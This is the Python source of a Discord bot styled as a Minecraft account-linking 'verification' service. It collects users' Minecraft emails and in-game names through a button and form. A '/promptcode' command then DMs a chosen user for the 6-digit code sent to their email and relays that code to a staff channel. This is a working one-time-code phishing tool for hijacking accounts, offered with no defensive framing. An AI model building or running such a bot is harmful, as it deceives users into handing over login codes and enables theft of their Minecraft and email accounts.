import os
import discord
from discord.ext import commands
import re  # To validate the 6-digit code

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295  # Verification channel ID
MOD_CHANNEL_ID = 1362997933552959558  # Mod channel ID

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
    ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)

        embed = discord.Embed(
            title="🔗 New Minecraft Verification",
            color=discord.Color.orange()
        )
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)

        embed.set_footer(text="This is an automated message.")

        await log_channel.send(embed=embed)
        await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('Bot is ready!')
    try:
        # Sync commands, including the newly added `/promptcode` command
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    # Delete old embeds
    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            embed = message.embeds[0]
            if embed.title == "🔗 Link Your Minecraft Account":
                await message.delete()

    # Send fresh embed
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await verification_channel.send(embed=embed, view=LinkView())

@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    # Delete old embeds
    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            embed = message.embeds[0]
            if embed.title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await interaction.response.send_message(embed=embed, view=LinkView(), ephemeral=True)

# New /promptcode command implementation
@bot.tree.command(name="promptcode", description="Send a prompt to a user to enter a 6-digit code")
async def promptcode(interaction: discord.Interaction, user: discord.User):
    # Send a message to the user in DM asking for a 6-digit code
    try:
        dm_channel = await user.create_dm()

        embed = discord.Embed(
            title="🔐 Enter Verification Code",
            description="Check your email for a code and send it here. Please provide a 6-digit code.",
            color=discord.Color.blue()
        )
        await dm_channel.send(embed=embed)

        # Wait for the user's response
        def check(message):
            return message.author == user and message.channel == dm_channel and re.match(r'^\d{6}$', message.content)

        # Wait for a valid message that matches the 6-digit format
        message = await bot.wait_for('message', check=check, timeout=60)  # Timeout after 60 seconds

        # Send the 6-digit code to the verification channel
        verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

        embed = discord.Embed(
            title="📝 New Verification Code",
            color=discord.Color.green()
        )
        embed.add_field(name="User", value=user.mention, inline=False)
        embed.add_field(name="Code", value=message.content, inline=False)
        await verification_channel.send(embed=embed)

        await dm_channel.send("✅ Code received! Thank you for verifying.")

    except Exception as e:
        await interaction.response.send_message(f"Error sending DM: {e}", ephemeral=True)
    else:
        await interaction.response.send_message(f"Verification prompt sent to {user.mention}!", ephemeral=True)

bot.run(TOKEN)
